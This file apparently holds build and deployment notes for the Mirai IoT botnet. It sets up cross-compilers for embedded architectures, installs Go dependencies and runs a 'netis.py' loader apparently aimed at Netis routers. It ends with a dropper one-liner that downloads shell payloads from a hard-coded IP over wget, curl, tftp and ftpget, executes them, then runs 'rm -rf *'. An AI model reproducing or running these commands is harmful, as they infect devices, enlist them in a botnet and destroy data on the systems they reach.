# mirai
INSTALL COMMAND
mkdir /etc/xcompile
cd /etc/xcompile
 
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
 wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
 
 tar -jxf cross-compiler-armv4l.tar.bz2
 tar -jxf cross-compiler-i586.tar.bz2
 tar -jxf cross-compiler-m68k.tar.bz2
 tar -jxf cross-compiler-mips.tar.bz2
 tar -jxf cross-compiler-mipsel.tar.bz2
 tar -jxf cross-compiler-powerpc.tar.bz2
 tar -jxf cross-compiler-sh4.tar.bz2
 tar -jxf cross-compiler-sparc.tar.bz2
 tar -jxf cross-compiler-armv6l.tar.bz2
 
 rm *.tar.bz2
 mv cross-compiler-armv4l armv4l
 mv cross-compiler-i586 i586
 mv cross-compiler-m68k m68k
 mv cross-compiler-mips mips
 mv cross-compiler-mipsel mipsel
 mv cross-compiler-powerpc powerpc
 mv cross-compiler-sh4 sh4
 mv cross-compiler-sparc sparc
 mv cross-compiler-armv6l armv6l

export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
 
export PATH=$PATH:/usr/local/go/bin
export GOPATH=$HOME/Documents/go

go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords
 






python netis.py netis.txt





cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.176.235.250/hac.sh; curl -O http://94.176.235.250/hac.sh; chmod 777 hac.sh; sh hac.sh; tftp 94.176.235.250 -c get tbin.sh; chmod 777 tbin.sh; sh tbin.sh; tftp -r tbin2.sh -g 94.176.235.250; chmod 777 tbin2.sh; sh tbin2.sh; ftpget -v -u anonymous -p anonymous -P 21 94.176.235.250 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf hac.sh tbin.sh tbin2.sh ftp1.sh; rm -rf *
